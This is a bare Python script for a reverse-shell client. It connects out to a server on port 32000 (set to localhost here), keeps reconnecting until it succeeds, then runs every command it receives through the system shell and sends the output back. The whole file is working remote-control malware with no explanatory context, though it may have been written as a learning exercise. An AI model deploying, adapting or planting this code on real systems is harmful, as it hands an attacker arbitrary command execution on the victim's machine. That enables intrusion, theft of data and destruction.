import socket
import time
import subprocess
HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

s = socket.socket()
print(f"Connecting to {HOST_IP}, port {HOST_PORT}......")
while True:
    try:
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print(f"Impossible to connect to server. Reconnection.....")
        time.sleep(4)
    else:
        print("Connection established")
        break

while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print(f"Command : {command}")
    result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
    respond = result.stdout + result.stderr
    # Ensures the server does not block if respond is nothing
    if not respond or len(respond) == 0:
        respond = " "
    header = str(len(respond.encode())).zfill(13)
    print(header)
    s.sendall(header.encode())
    s.sendall(respond.encode())

s.close()